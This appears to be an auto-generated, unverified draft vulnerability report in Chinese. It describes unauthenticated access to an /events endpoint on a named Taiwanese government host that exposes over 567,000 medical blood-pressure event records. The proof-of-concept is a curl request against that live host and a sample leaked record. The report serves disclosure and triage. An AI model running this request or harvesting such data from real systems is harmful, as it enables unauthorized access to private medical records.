# POC/EXP — 4001 端口 /events 端点未授权访问 - 泄露 567k+ 医疗 PCDT 事件数据

> 漏洞ID: `2717903a-e433-4116-b596-e88f0e4d9092`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4001/events`

**類型**: Broken Access Control

## 描述

GET /events 端点无需任何认证即可访问，返回 567,201 条 PCDT（压力负荷试验）事件数据。每条记录包含 CaseID、recordUuid、Caption、TypeOfEventTxt、TypeOfEventNum、Elapsed、Timestamp、Systolic、Diastolic、Mean、BPUnit、Annotation 等完整医疗数据。支持 content-range 分页（items 0-99/567201）。

## POC / 復現步驟

```
```
$ curl -sk "https://epcr.tpf.gov.tw:4001/events?limit=5"
HTTP/1.1 200 OK
content-range: items 0-99/567201
content-type: application/json; charset=utf-8

[{"id":2,"CaseID":"180717152801fed7","recordUuid":"Test180805142701","Caption":"End of PCDT","TypeOfEventTxt":"endofPCDT","TypeOfEventNum":"433","Elapsed":1059221,"Timestamp":"2018-07-17T07:45:40.000Z","Value":null,"Unit":null,"Systolic":null,"Diastolic":null,"Mean":null,"BPUnit":null,"ExceededAbove":null,"AlarmedBPTypeTxt":null,"AlarmedBPTypeNum":null,"LimitValue":null,"LimitUnit":null,"Annotation":null,"createdAt":"2018-08-14T09:48:14.000Z","updatedAt":"2018-08-14T09:48:14.000Z"},...]
```
总记录数：567,201 条（从 content-range header 确认）
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
